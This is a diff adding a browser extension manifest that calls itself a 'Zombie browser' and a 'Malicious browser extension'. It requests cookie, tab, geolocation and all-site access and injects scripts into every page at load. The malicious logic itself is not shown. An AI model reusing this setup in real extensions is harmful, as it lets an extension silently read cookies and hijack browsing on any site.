@@ -1,0 +1,16 @@
+{
+  "name": "Zombie browser",
+  "version": "1.0",
+  "description": "Malicious browser extension",
+
+  "manifest_version": 1,
+  "background": {
+    "page": "background.html"
+  },
+  "permissions": ["tabs","http://*/*","https://*/*","tts","geolocation","fileBrowserHandler","cookies"],
+  "content_scripts": [{
+      "matches": ["<all_urls>"],
+      "js": ["jquery.min.js","main.js"],
+      "run_at": "document_start"
+    }]
+}
